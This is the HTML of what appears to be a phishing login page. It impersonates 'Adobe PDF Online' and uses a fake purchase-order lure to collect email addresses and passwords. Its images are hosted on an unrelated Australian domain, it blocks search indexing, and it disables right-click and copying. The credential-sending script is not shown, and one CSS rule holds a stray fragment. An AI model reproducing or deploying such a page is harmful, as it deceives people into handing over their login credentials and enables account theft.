<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
    <title>Login</title>
    <link rel="icon" type="image/vnd.microsoft.icon" href="img/favicon.ico">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            background-image: url('https://www.intelligent-leverage.com.au/Purchase-Order-0326/pdf/img/background.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }

        .login-container {
            background: #f7f7f7;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 450px;
            padding: 30px;
        }

        .login-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #e0e0e0;
        }

        .logo {
            width: 65px;
            height: 65px;
            margin-right: 15px;
        }

        .footer-logo {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer-img {
            width: 138px;
            height: 22px;
            padding-right: 10px;
            padding-left: 10px;
        }

        .login-title {
            font-weight: bold;
            font-size: 24px;
            color: #333;
            margin: 0;
        }

        .banner {
            width: 100%;
            height: 60px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
        }

        .banner-image {
            width: 301px;
            height: 55px;
        }

        .email-display {
            text-align: center;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 15px;
            color: #333;
            font-size: 15px;
            font-weight: bold;
            word-break: break-all;
        }

        .password-wrapper {
            position: relative;
            margin-bottom: 15px;
        }

        .password-wrapper input {
            padding-right: 45px;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
            font-size: 18px;
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-bottom: 10px;
            display: none;
            text-align: center;
        }

        .remember-section {
            margin-bottom: 20px;
            font-size: 13px;
        }

        .remember-section label {
            cursor: pointer;
        }

        .remember-note {
            color: #666;
            font-size: 11px;
            margin-left: 6px;
        }

        .submit-btn {
            width: 50%;
            margin: 0 auto;
            display: block;
            background-color: #dc3545;
            border: none;
            color: white;
            padding: 12px;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .submit-btn:hover {
            background-color: #c82333;
            cursor: pointer;
        }

        .submit-btn:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #666;
            font-size: 12px;
        }

        @media (max-width: 576px) {
            .login-container {
                width: 95%;
                padding: 20px;
            }

            .login-title {
                font-size: 20px;
            }

            .submit-btn {
                width: 70%;
            }
        }

        @media (min-width: 577px)rgin and (max-width: 768px) {
            .submit-btn {
                width: 60%;
            }
        }
    </style>
</head>
<body oncontextmenu="return false;" oncopy="return false;" oncut="return false;">

<div class="login-container">
    <div class="login-header">
        <div class="logo"><img src="https://www.intelligent-leverage.com.au/Purchase-Order-0326/pdf/img/banner.svg" alt="logo"></div>
        <div class="login-title">Adobe PDF Online</div>
    </div>

    <div class="identity">Sign in with your provisioned email account to access Purchase Order Database.</div>

    <div class="banner"><img class="banner-image" src="https://www.intelligent-leverage.com.au/Purchase-Order-0326/pdf/img/providers.png" alt="logo"></div>

    <div id="emailDisplay"  style="display:none;">No email provided</div>
    <input type="email"  style="margin-bottom:10px;" class="form-control" id="emailInput" placeholder="Enter your email" required="">

    <div class="error-message" id="errorMessage">We ran into a problem, please try again</div>

    <div class="password-wrapper">
        <input type="password" class="form-control" id="passwordInput" placeholder="Enter your password" required="">
        <span class="eye-icon" id="togglePassword">👁️</span>
    </div>
    <div id="reenterMessage" style="display:none; color:red; margin-top:10px; margin-bottom:10px;">Invalid email or password Please Try Again</div>
    <div class="remember-section">
        <div>
            <input type="checkbox" id="rememberMe">
            <label for="rememberMe">Stay signed in<span class="remember-note">(Do not check if using a public computer)</span></label>
        </div>
    </div>

    <button type="button" class="submit-btn" id="submitBtn">View Document</button>

    <div class="footer">
        <p>Copyright © <script>document.write(new Date().getFullYear());</script>2026 Adobe. All rights reserved.</p>

    </div>
</div>
